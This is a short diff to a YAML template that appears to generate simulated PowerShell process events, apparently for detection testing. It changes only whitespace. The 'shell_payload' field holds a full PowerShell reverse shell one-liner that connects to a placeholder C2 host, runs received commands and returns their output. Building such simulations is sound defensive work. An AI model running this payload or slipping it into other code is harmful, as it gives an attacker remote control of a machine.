@@ -38,11 +38,11 @@ state:
   exec_path:           'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
   original_file_name:  PowerShell.EXE
   shell_payload: |-
-    $client = New-Object System.Net.Sockets.TCPClient('${ref.c2_host}',${ref.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+    $client = New-Object System.Net.Sockets.TCPClient('${ref.c2_host}',${ref.c2_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
   command_line:        '"${ref.exec_path}" -nop -c "${ref.shell_payload}"'
   current_directory:   'C:\Users\${ref.username}\'
   parent_image:        'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
-  parent_command_line: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
+  parent_command_line: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" '
 
 steps:
   - emit:
